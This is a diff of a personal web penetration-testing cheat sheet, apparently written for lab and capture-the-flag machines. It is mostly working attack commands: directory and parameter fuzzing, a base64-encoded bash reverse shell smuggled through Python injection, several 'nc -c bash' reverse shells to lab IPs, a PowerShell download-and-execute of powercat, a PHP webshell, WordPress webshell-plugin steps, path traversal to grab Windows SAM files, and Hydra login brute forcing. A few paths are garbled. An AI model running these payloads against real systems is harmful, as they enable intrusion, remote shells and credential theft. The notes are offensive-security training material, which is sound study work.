@@ -4,35 +4,77 @@
 ```bash
 sudo nmap -p80 --script=http-enum $ip
 ```
-2. Analyze tech stack with Wappalyzer
+#### Analyze tech stack with Wappalyzer
 
-3. Brute force directories, subdomains, files and apis
+#### Fuzzing directories and files
 ```bash
 # /opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt
 gobuster dir -u http://$url:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://$url:50000/FUZZ/"
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://$url/FUZZ"
-gobuster dir -u $url -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
-# for api busting
-cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
-sed -i 's/^/{GOBUSTER}\//' apis
-gobuster dir -u $url:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
+gobuster dir -u $url -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -erk -t 30 -x php,txt,html,whatever
+
 # If you get hits, try to discover more directories using a smaller wordlist
 
-# Once you have the hostname, search for vhost
-feroxbuster -k -u $url -x php -o streamio.htb.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
-[Enter] -> c -f {number of search to cancel}
-
-# Subdomains
-gobuster dns -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
-python dome.py -m active -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
-
+# IIS Additional Fuzzing
 java -jar iis_shortname_scanner.jar $url/ /opt/windows/IIS-ShortName-Scanner/release/config.xml
 cd /opt/windows/sns && go run main.go -u http://nagoya.nagoya-industries.com
 ffuf -k -u "$url/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106
 /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt
+```
 
-# Fuzzing APIs
+#### Fuzzing Subdomains & vhosts
+
+```bash
+gobuster dns -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+python dome.py -m active -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$dom" -u http://$ip:8080
+feroxbuster -k -u $url -x php -o vhost.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+[Enter] -> c -f {number of search to cancel}
+```
+
+##### Fuzzing URL
+
+An amazing resource is Cobalt's SSTI page.
+```bash
+# Copy request from burpsuite to file, search.req
+# Insert FUZZ where you want to fuzz
+ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-chars.txt
+# Below for post
+# ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -w ports.txt:FUZZ -fs 61
+# If you wanted to match size of a particular response, you could add '-ms 0'
+# Filtering by lines would be '--fl 34'
+# Check for quick SQL injection, adding url-encoded ';#---, so '%27%3B%23---'
+# Depends on the language being used, if Python, test string concatenation, such as adding "sup')%2B'dawg'"%23. The %23 is to comment out remaining command
+&query=sup')%2Bprint('hi')%23
+&query=sup')%2B__import__('os').system('id')%23
+&query=sup')%2B__import__('os').system('echo%20-n%20YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC84MCAwPiYxICcK%20|base64%20-d|bash')%23
+```
+
+#### Fuzzing URL
+
+```bash
+# Multiple paramaters
+ffuf -request search.req -request-proto http -w emails.txt:USER -w ../../passwords.txt:PASS
+
+# Fuzzing directly in URL, in this case, testing for parameters.
+ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+
+# If you need to be authorized/logged in
+ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=k2285854j74rk51pctgl7kes34'
+
+# SQLi
+ffuf -request sql.req -request-proto http -w ~/repos/offsec/lists/sqli.txt:FUZZ
+
+# LFI
+ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u $url/?page=FUZZ
+```
+
+#### Fuzzing APIs
+
+You can use the same commands for testing url parameters.
+
+```bash
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/objects.txt --hc 404 $url/FUZZ
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt --hc 404 $url/FUZZ
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt --hc 404 $url/FUZZ
@@ -42,25 +84,44 @@ ffuf -k -u $url/api/FUZZ -w /home/kali/repos/offsec/lists/sqli.txt
 fuff -u $url/weather/forecast?city=\'FUZZ-- -w /opt/SecLists/Fuzzing/special-characters.txt -mc 200,500 -fw 9
 curl -X POST -H 'Content-Type: application/json' --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/update
 curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}'$url:13337/update
+cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
+sed -i 's/^/{GOBUSTER}\//' apis
+gobuster dir -u $url:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
+# Start testing with curl for csrf.
+curl -si --data "code=1+1" # {7*7}...
+curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
 ```
-4. Nikto
-```bash
-nikto --host $ip -ssl -evasion 1
-```
-5. Manual code inspection
 
-- Look for emails, names, user info, versioning (chhttp://editorial.htb/upload?ecking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
+#### Nikto
+
+```bash
+nikto --host $url -ssl -evasion 1
+nikto -ask=no -nointeractive -host $url 2>&1
+nikto -ask=no -host $url 2>&1
+```
+
+#### Manual code inspection
+
+DONT IGNORE THIS.
+
+- Look for emails, names, user info, versioning checking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
 - Inspect every fkn inch of the website
 
-5. LFI
+(http://editorial.htb/upload?
+
+#### LFI
 
 https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
 
-KNOW THAT YOU CAN PIVOT TO WHOEVER IS RUNNING HTE WEBSERVER ONCE YOU HAVE INITIAL ACCESS. or write abilities in a web folder.
+```bash
+ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u $url/?page=FUZZ
+```
 
-6. WordPress
+#### KNOW THAT YOU CAN PIVOT TO WHOEVER IS RUNNING HTE WEBSERVER ONCE YOU HAVE INITIAL ACCESS. or write abilities in a web folder.
 
-WPscan if it's wordpress
+#### WordPress
+
+WPscan if it's wordpress. Add "-U $user -P $pass if you have credentials".
 
 ```bash
 wpscan --url $url --enumerate p --plugins-detection aggressive # aggressive plugin detection
@@ -73,11 +134,21 @@ gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins
 gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -k -t 10 --exclude-length 6
 ```
 
-Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.
+Malicious plugin.
 
-7. Potentially brute forcing admin/login panel with Burp Intruder
+- Go to admin page > Plugins --> Add New
+- Upload the zip https://github.com/p0dalirius/Wordpress-webshell-plugin/blob/master/dist/wordpress-webshell-plugin-1.1.0.zip and activate the plugin
+- Download https://github.com/p0dalirius/Wordpress-webshell-plugin/blob/master/console.py
 
-8. Create a wordlist from the webpage using cewl:
+```bash
+python console.py -t $url/wordpress
+```
+
+#### Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.
+
+#### Brute forcing admin/login panel with Burp Intruder
+
+#### Create a wordlist from the webpage using cewl:
 
 ```bash
 cewl -g --with-numbers -d 20 $url |grep -v CeWL >> custom-wordlist.txt
@@ -85,24 +156,28 @@ cewl http://example.com -d 4 -m 5 -w cewl.txt
 hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule cewl.txt > cewl-best64.txt
 ```
 
-9. Run droopescan
+#### Other CMS
+
 ```bash
 droopescan -t <number_of_threads> <target_website>
+joomscan --ec -u $RHOST:$RPORT_HTTP
 ```
 
-10. XSS (Input Fields)
+#### XSS (Input Fields)
 - Spam special characters, see what is filtered, what gets interpreted as code
+
 ```bash
 ~!@#$%^&*()-_+={}][|\`,./?;:'"<>
 ```
+
 - If our input is being added between div tags, we'll need to include our own script tags4 and need to be able to inject "<" and ">" as part of the payload
 - If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code
 
-11. 403 Forbidden Bypass
+#### 403 Forbidden Bypass
 
 Refer to 403-forbidden-bypass.sh.
 
-12. Header Injection
+#### Header Injection
 
 - Check if you can inject the following into the User-Agent header:
 
@@ -127,7 +202,7 @@ echo BASE64_ENCODED_STRING | base64 -d
 {echo,-n,**base64 encoded reverse bash shell**}|{base64,-d}|bash
 ```
 
-13. Directory Traversal
+#### Directory Traversal
 
 - For directory traversals, try to start with a '/', so "http://192.168.165.43/index.php?p=backup/../../../../../../../../"
 
@@ -164,11 +239,7 @@ wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfi
 wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csam.old -O SAM
 ```
 
-14. Stealing Session Cookies
-
-- See if there are any cookies present without the HttpOnly and Secure flags. If this is in the context of WordPress, there's a walkthrough in ../notes/web_assessment_and_xss.md.
-
-15. Log Poisoning / Local File Inclusion
+#### Log Poisoning / Local File Inclusion
 
 - RCE (PHP) through log poisoning (likely /var/log/apache2/access.log). See if you can read the file and see what contents are stored (i.e. User-Agent):
 
@@ -189,7 +260,7 @@ GET /subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log
 
 ..if something else, do something else.
 
-16. PHP Wrappers
+#### PHP Wrappers
 
 Attempt to show the contents of php file:
 
@@ -207,7 +278,11 @@ curl "http://example.com/subdir/index.php?page=data://text/plain;base64,PD9waHAg
 # or a reverse shell
 ```
 
-17. Remote File Inclusion
+```bash
+php://filter/read=convert.base64-encode/resource=index.php
+```
+
+#### Remote File Inclusion
 
 - If the website is loading files or contents from remote systems, then RFI may be possible. You can go into Developer Tools to discover this in source, etc.
 
@@ -224,7 +299,7 @@ view=C:/windows/system32/drivers/etc/hosts
 view=//$myip/test/share
 ```
 
-18. File Upload Vulns (Executable)
+#### File Upload Vulns (Executable)
 
 THINK ABOUT RCE WHENEVER YOU HAVE LFI.
 
@@ -311,7 +386,7 @@ GIF89a;
 <?php system($_GET["cmd"]); ?
 ```
 
-19. File Upload Vulns (Non-Executable)
+#### File Upload Vulns (Non-Executable)
 
 - When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
 
@@ -326,7 +401,7 @@ kali@kali:~$ cat keyname.pub > authorized_keys
 
 Then, use the method as told above on the path "../../../../../../../root/.ssh/authorized_keys" or "/home/www-data/.ssh/authorized_keys", noting that you can try a username instead or "~/.ssh/authorized_keys" or "%USERPROFILE%\.ssh\authorized_keys" for Windows. If you can read /etc/passwd, then adjust to the names. Make sure to delete the known_hosts file if you have used the key with another machine. I assume that you can also just create a new one to use without deleting the file.
 
-20. OS Command Injection
+#### OS Command Injection
 
 If there's any part of the website that intakes commands, see if you can add your own. They're likely filtered, though you may be able to get around this by closing off the command with a semicolon. In the following example, we saw (with Burp) that the commands were being sent through the Archive header with a Post:
 
@@ -342,99 +417,42 @@ nc -lvnp 4444
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
 ```
 
-21. SQL Injection
+```bash
+& command
+&& command
+; command
+command %0A command
+| command
+|| command
+`command`
+$(command)
+```
+
+#### SQL Injection
 
 - Refer to ./sqli.md
 
-22. Client-Side Attacks
+#### Client-Side Attacks
 
 If there if a section where you can mail the company, refer to ../notes/client_side_attacks.md. Also look out for svc, anything where files with Macros can be accepted.
 
-23. Exiftool
+#### Exiftool
 
 Use exiftool to analyze a few documents on the website, see what information you can get. Wget will give you better information than curl.
 
-24. Brute-Force Passwords
+#### Brute-Force Passwords
 
 Refer to ../notes/password_cracking.md
 
 Additional Resources at "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web".
 
-25. API
+#### IDOR
 
-````
-http://192.168.214.150:8080/search
-{"query":"*","result":""}
-````
-````
-curl -X GET "http://192.168.214.150:8080/search?query=*"
-{"query":"*","result":""}
-
-curl -X GET "http://192.168.214.150:8080/search?query=lol"
-{"query":"lol","result":""}
-````
----
-
-````
-curl http://$ip/api/
-````
-````
-[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 
-````
-````
-curl http://$ip/api/user/ 
-````
-````
-[{"login":"UserA","password":"test12","firstname":"UserA","lastname":"UserA","description":"Owner","id":10},{"login":"UserB","password":"test13","firstname":"UserB","lastname":"UserB","description":"Owner","id":30},{"login":"UserC","password":"test14","firstname":"UserC","lastname":"UserC","description":"Owner","id":6o},{"login":"UserD","password":"test15","firstname":"UserD","lastname":"UserD","description":"Owner","id":7o},{"login":"UserE","password":"test16","firstname":"UserE","lastname":"UserE","description":"Owner","id":100}]
-````
-
-##### Fuzzing URL
-
-An amazing resource is Cobalt's SSTI page.
-```bash
-# Copy request from burpsuite to file, search.req
-# Insert FUZZ where you want to fuzz
-ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-chars.txt
-# Below for post
-# ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -w ports.txt:FUZZ -fs 61
-# If you wanted to match size of a particular response, you could add '-ms 0'
-# Filtering by lines would be '--fl 34'
-# Check for quick SQL injection, adding url-encoded ';#---, so '%27%3B%23---'
-# Depends on the language being used, if Python, test string concatenation, such as adding "sup')%2B'dawg'"%23. The %23 is to comment out remaining command
-&query=sup')%2Bprint('hi')%23
-&query=sup')%2B__import__('os').system('id')%23
-&query=sup')%2B__import__('os').system('echo%20-n%20YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC84MCAwPiYxICcK%20|base64%20-d|bash')%23
-```
-
-Multiple paramaters:
+Appending another id to the api call to bypass restrictions.
 
 ```bash
-ffuf -request search.req -request-proto http -w emails.txt:USER -w ../../passwords.txt:PASS
-```
-
-Fuzzing directly in URL, in this case, testing for parameters.
-
-```bash
-ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
-```
-
-If you need to be authorized/logged in:
-
-```bash
-ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=k2285854j74rk51pctgl7kes34'
-```
-
-If you run into an api, start testing with curl. If csrf is there, execute code.
-
-```bash
-curl -si --data "code=1+1" # {7*7}...
-curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
-```
-
-SQLi.
-
-```bash
-ffuf -request sql.req -request-proto http -w ~/repos/offsec/lists/sqli.txt:FUZZ
+GET /api/v1/messages?id=<Another_User_ID> # unauthorized
+GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> # authorized
 ```
 
 #### Retrieve cookie, response headers
@@ -452,6 +470,7 @@ curl -H 'X-Forwarded-For: localhost' http://192.168.193.134:13337/logs
 wfuzz -c -z file,/home/kali/repos/offsec/lists/lfi.txt --hc 404,500 -H 'X-Forwarded-For: localhost' 'http://192.168.193.134:13337/logs?file=FUZZ'
 curl -X POST -H 'X-Forwarded-For: localhost' -H 'Content-Type: application/json' --data '{"user":"clumsyadmin", "url":";nc -c bash 192.168.45.178 443"}' 'http://192.168.193.134:13337/update'
 ```
+
 #### Fuzzing Input Paramater
 
 Find the parameter in Burp to what you want to FUZZ, as well as the Content-Type in Request Headers.
@@ -461,26 +480,23 @@ ffuf -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /opt/SecLists/Fuzzi
 
 Note that it sends the payload non-url-encoded.
 
-#### Hydra for Popups
+
+#### Bruteforcing Logins
+
+Popup Logins.
 
 ```bash
-hydra -l user -P pwdpath ip http-get
-# -I to override previous scan with updated list
+hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-get
 ```
 
-#### Hydra for Webapp Login Brute
+Webapp Login Brute.
 
 ```bash
+hydra -V -f -l $user -P /usr/share/wordlists/rockyou.txt -s $port $ip http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
 hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 ```
 
-For Tomcat.
-
-```bash
-python tomcat-login.py -H $ip -P http -m /manager/html -p 8080
-```
-
-#### Hydra for Base64 encoded login
+Base64 encoded login.
 
 ```bash
 cewl http://$ip:8081/ -d 8| grep -v CeWL >> custom-wordlist.txt
@@ -494,6 +510,12 @@ cewl --lowercase http://$ip:8081/ -d 8| grep -v CeWL  >> custom-wordlist.txt
 # F=403 tells hydra that HTTP 403 means invalid login
 hydra -I -f -L usernames.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
 hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
+```
+
+#### Tomcat
+
+```bash
+python tomcat-login.py -H $ip -P http -m /manager/html -p 8080
 ```
 
 #### Exposed Git Repo from URL
@@ -519,6 +541,23 @@ To modify vhost you would switch "Host: 10.10.11.177" to "Host: dev.siteisup.htb
 
 Refer to 'https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/webservers-appservers' for application specific seen locations.
 
+#### phpinfo
+
+Lots of juicy information.
+
+- ServerRoot
+- Loaded plugins
+- upload_tmp_dir
+- file_uploads
+- allow_url_include
+- extension_dir
+- session.*
+- Users || /home
+- ..
+
+```bash
+```
+
 #### Automatically Adding Custom Header in BurpSuite
 
 Go to Proxy > Options > Scroll Down to Match and Replace > Add the header in Replace section
@@ -535,6 +574,9 @@ _method=patch&authenticity_token=sqroxonHHHMVjShpvoFQxdQaO5lP9Z-w_XCLkSzgHY9UDTz
 _method=patch&authenticity_token=RSv5NyN2tJJgQcgbwtyWzA7oHYcTW4dSZNsLoHuASc-jjC0TIDRo5kuYyn14j1Wyc7dD0BxLM0cGaqjU7xmwcQ&user%5Bconfirmed%5D=True&commit=Change%20email
 ```
 
+#### Stealing Session Cookies
+
+- See if there are any cookies present without the HttpOnly and Secure flags. If this is in the context of WordPress, there's a walkthrough in ../notes/web_assessment_and_xss.md.
 
 #### GraphQL
 
